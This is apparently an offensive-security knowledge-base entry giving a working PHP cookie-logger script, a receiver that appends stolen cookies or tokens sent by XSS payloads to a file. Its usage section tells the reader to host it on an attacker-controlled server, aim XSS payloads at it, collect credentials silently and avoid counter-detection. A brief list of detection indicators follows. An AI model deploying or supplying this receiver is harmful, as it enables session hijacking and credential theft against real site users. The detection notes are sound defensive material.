---
id: aca24532-3c69-4951-943f-e774c7938295
type: code
language: php
verified: true
created_at: '2023-04-06T03:56:41.637897+00:00'
updated_at: '2023-04-10T20:21:43.600851+00:00'
platforms:
  - Web
tags:
  - xss
  - exfiltration
  - logger
validated: true
---

# PHP-Cookie-Logger-Script

## Code

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

## Description

This PHP script acts as a simple receiver for exfiltrated data from XSS payloads. It captures the 'c' query parameter (containing cookies or tokens), appends it to a log file named 'cookies.txt' with a 'Cookie:' prefix, and handles multiple submissions via append mode. Deploy as a web-accessible endpoint to collect stolen credentials silently.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'cookies.txt' | Output log file path (customize for security, e.g., in a protected directory) | /var/log/stolen_cookies.txt |
| $_GET['c'] | Input parameter holding the exfiltrated data (cookie or token string) | sessionid=abc123 |

## Usage

Host this script on an attacker-controlled web server (e.g., as grabber.php or cookie.php). Point XSS payloads to this URL. After victim interaction, tail or view the log file to retrieve data. Use in conjunction with XSS for credential collection; secure the server to prevent counter-detection.

## Detection

- Web server access logs showing repeated GET requests to the endpoint with sensitive data in URLs.
- File system monitoring for unexpected writes to log files in web directories.
- Network traffic analysis revealing data exfiltration to external IPs.
- PHP error logs if file permissions prevent writing.

## Related

- [[procedures/Exploit-XSS-to-Steal-Cookies-and-Access-Tokens]]
